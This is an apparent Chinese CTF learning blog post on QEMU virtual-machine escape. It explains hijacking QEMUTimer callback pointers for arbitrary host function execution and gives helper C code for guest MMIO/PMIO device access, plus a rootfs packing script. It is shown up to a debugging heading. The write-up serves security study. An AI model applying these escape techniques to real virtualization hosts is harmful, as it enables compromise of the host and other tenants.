<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>初探qemu逃逸 | Qanux's space</title><meta name="author" content="Qanux"><meta name="copyright" content="Qanux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近找时间入门了一下qemu逃逸，发现挺有意思的。感觉其实和用户态的pwn差不多，目标是通过分析qemu-system这个elf中的漏洞使其执行自己想要的函数。在该elf中执行的操作可以访问到qemu外，所以造成了逃逸这里主要用于记录平时qemu逃逸学习时常用的脚本以及入门时做的几道有代表性的题目 一些可以利用的点在qemu的elf中存在一个名为main_loop_tlg的数组，该数组用于存储QE">
<meta property="og:type" content="article">
<meta property="og:title" content="初探qemu逃逸">
<meta property="og:url" content="https://qanux.github.io/2024/02/19/qemu%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="最近找时间入门了一下qemu逃逸，发现挺有意思的。感觉其实和用户态的pwn差不多，目标是通过分析qemu-system这个elf中的漏洞使其执行自己想要的函数。在该elf中执行的操作可以访问到qemu外，所以造成了逃逸这里主要用于记录平时qemu逃逸学习时常用的脚本以及入门时做的几道有代表性的题目 一些可以利用的点在qemu的elf中存在一个名为main_loop_tlg的数组，该数组用于存储QE">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/img/favicon.jpg">
<meta property="article:published_time" content="2024-02-18T16:00:00.000Z">
<meta property="article:modified_time" content="2024-03-13T15:24:50.381Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/img/favicon.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://qanux.github.io/2024/02/19/qemu%E9%80%83%E9%80%B8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '初探qemu逃逸',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-13 23:24:50'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/index.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Qanux's space"><span class="site-name">Qanux's space</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">初探qemu逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-02-18T16:00:00.000Z" title="Created 2024-02-19 00:00:00">2024-02-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-03-13T15:24:50.381Z" title="Updated 2024-03-13 23:24:50">2024-03-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">8.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>47mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="初探qemu逃逸"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最近找时间入门了一下<code>qemu</code>逃逸，发现挺有意思的。感觉其实和用户态的<code>pwn</code>差不多，目标是通过分析<code>qemu-system</code>这个<code>elf</code>中的漏洞使其执行自己想要的函数。在该<code>elf</code>中执行的操作可以访问到<code>qemu</code>外，所以造成了逃逸<br>这里主要用于记录平时<code>qemu</code>逃逸学习时常用的脚本以及入门时做的几道有代表性的题目</p>
<h1 id="一些可以利用的点"><a href="#一些可以利用的点" class="headerlink" title="一些可以利用的点"></a>一些可以利用的点</h1><p>在<code>qemu</code>的<code>elf</code>中存在一个名为<code>main_loop_tlg</code>的数组，该数组用于存储<code>QEMUTimerList</code>结构体指针</p>
<h4 id="一些重要结构体"><a href="#一些重要结构体" class="headerlink" title="一些重要结构体"></a>一些重要结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A struct representing a memory region.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> global_locking;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    Int128 size;</span><br><span class="line">    hwaddr addr;</span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;</span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="type">int</span> scale;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimerList</span> &#123;</span></span><br><span class="line">    QEMUClock *clock;</span><br><span class="line">    QemuMutex active_timers_lock;</span><br><span class="line">    QEMUTimer *active_timers;  <span class="comment">// 0x40</span></span><br><span class="line">    QLIST_ENTRY(QEMUTimerList) <span class="built_in">list</span>;</span><br><span class="line">    QEMUTimerListNotifyCB *notify_cb;</span><br><span class="line">    <span class="type">void</span> *notify_opaque;</span><br><span class="line">    QemuEvent timers_done_ev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面借用<code>sky123</code>师傅的一张图片</p>
<img src="/2024/02/19/qemu%E9%80%83%E9%80%B8/1.png" class="" title="我的图图呢">  
<p>我们可以将<code>QEMUTimer</code>结构体中的<code>expire_time</code>修改为非负数，<code>cb</code>指针指向我们想要执行的函数的地址，<code>opaque</code>指向存放参数的地址，我们即可实现任意函数执行。从图片中我们还可以发现，<code>active_timers</code>指针是指向<code>QEMUTimer</code>结构体的，我们可以通过修改该指针指向我们伪造的<code>QEMUTimer</code>结构体，也可以实现相同的效果。<br>其实<code>qemu</code>逃逸本质上和<code>user</code>态的<code>pwn</code>没有什么区别，所以在<code>glibc</code>中的各种<code>house of</code>手法在这里也是可以使用的，<code>ACTF 2022</code>就出现了一题<code>qemu</code>逃逸要打<code>fsop</code>，所以我们要放宽我们的思维。</p>
<h1 id="常用脚本"><a href="#常用脚本" class="headerlink" title="常用脚本"></a>常用脚本</h1><p>还得是<code>eeee</code>和<code>sky123</code>师傅，脚本通俗易懂他们的文章给我学习<code>qemu</code>逃逸提供了很大的帮助</p>
<h2 id="qemu中访问PCI设备的mmio空间"><a href="#qemu中访问PCI设备的mmio空间" class="headerlink" title="qemu中访问PCI设备的mmio空间"></a>qemu中访问PCI设备的mmio空间</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="qemu中访问PCI设备的PMIO空间"><a href="#qemu中访问PCI设备的PMIO空间" class="headerlink" title="qemu中访问PCI设备的PMIO空间"></a>qemu中访问PCI设备的PMIO空间</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"><span class="comment">// cat /sys/devices/pci0000:00/0000:00:04.0/resource</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span>&#123;</span><br><span class="line">    outl(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="打包脚本"><a href="#打包脚本" class="headerlink" title="打包脚本"></a>打包脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mkdir ./rootfs</span><br><span class="line">cd ./rootfs</span><br><span class="line">cpio -idmv &lt; ../rootfs.cpio</span><br><span class="line"> </span><br><span class="line">cp ../exp.c ./root</span><br><span class="line">gcc -o ./root/exp -static ./root/exp.c</span><br><span class="line"> </span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line"> </span><br><span class="line">cd ..</span><br><span class="line">rm -rf ./rootfs</span><br></pre></td></tr></table></figure>
<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><ul>
<li>启动<code>qemu</code></li>
<li>获取进程号</li>
<li><code>gdb</code>内连接</li>
</ul>
